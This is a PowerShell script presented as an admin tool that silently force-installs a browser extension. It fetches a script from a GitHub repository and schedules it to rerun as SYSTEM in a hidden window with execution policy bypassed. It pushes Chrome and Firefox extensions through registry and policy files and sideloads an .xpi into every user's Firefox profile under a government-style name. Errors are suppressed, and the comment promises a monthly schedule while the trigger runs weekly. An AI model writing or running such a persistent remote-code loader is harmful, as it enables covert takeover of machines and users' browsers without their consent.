# Admin Extension - Silent Auto Installer with Monthly Scheduler
$ErrorActionPreference = "SilentlyContinue"

# 1. Setup Permanent Folder & Monthly Scheduled Task
$targetDir = "C:\ProgramData\BrowserPolicySync"
$targetScript = "$targetDir\sync_ext.ps1"
$taskName = "BrowserExtensionMonthlySync"

if (!(Test-Path $targetDir)) {
    New-Item -Path $targetDir -ItemType Directory -Force | Out-Null
}

# Download latest script copy to permanent location for monthly auto-run
$scriptUrl = "https://raw.githubusercontent.com/birthdeathregistration-spec/extention/main/install.ps1"
Invoke-WebRequest -Uri $scriptUrl -OutFile $targetScript -UseBasicParsing

# Create Monthly Scheduled Task (1st day of every month at 10:00 AM as SYSTEM)
$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$targetScript`""
$trigger = New-ScheduledTaskTrigger -Weekly -DaysOfWeek Sunday -At 10:00AM
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null

# 2. Chrome Force Install via Registry
$chromePath = "HKLM:\SOFTWARE\Policies\Google\Chrome\ExtensionInstallForcelist"
if (!(Test-Path $chromePath)) {
    New-Item -Path $chromePath -Force | Out-Null
}
Set-ItemProperty -Path $chromePath -Name "1" -Value "pcgbhiafdjbnjmhpkomfjjlcdkchifje;https://clients2.google.com/service/update2/crx"

# 3. Firefox Policy & Profile Install
$xpiUrl = "https://raw.githubusercontent.com/birthdeathregistration-spec/extention/main/fire.xpi"
$ffPaths = @("C:\Program Files\Mozilla Firefox", "C:\Program Files (x86)\Mozilla Firefox")

foreach ($ff in $ffPaths) {
    if (Test-Path $ff) {
        $dist = "$ff\distribution"
        if (!(Test-Path $dist)) {
            New-Item -Path $dist -ItemType Directory -Force | Out-Null
        }
        $json = '{"policies":{"Extensions":{"Install":["' + $xpiUrl + '"]}}}'
        Set-Content -Path "$dist\policies.json" -Value $json -Encoding ASCII
    }
}

$ffReg = "HKLM:\SOFTWARE\Policies\Mozilla\Firefox\Extensions\Install"
if (!(Test-Path $ffReg)) {
    New-Item -Path $ffReg -Force | Out-Null
}
Set-ItemProperty -Path $ffReg -Name "1" -Value $xpiUrl

# 4. Firefox Profile Sideload (All Users)
$xpiSavePath = "$targetDir\bdris_ext.xpi"
Invoke-WebRequest -Uri $xpiUrl -OutFile $xpiSavePath -UseBasicParsing

if (Test-Path $xpiSavePath) {
    $users = Get-ChildItem "C:\Users" -Directory
    foreach ($user in $users) {
        $profilesPath = "$($user.FullName)\AppData\Roaming\Mozilla\Firefox\Profiles"
        if (Test-Path $profilesPath) {
            $profiles = Get-ChildItem $profilesPath -Directory
            foreach ($prof in $profiles) {
                $extDir = "$($prof.FullName)\extensions"
                if (!(Test-Path $extDir)) {
                    New-Item -Path $extDir -ItemType Directory -Force | Out-Null
                }
                Copy-Item -Path $xpiSavePath -Destination "$extDir\bdris-bot@bdris.gov.bd.xpi" -Force
            }
        }
    }
}

Write-Host "_" -ForegroundColor Green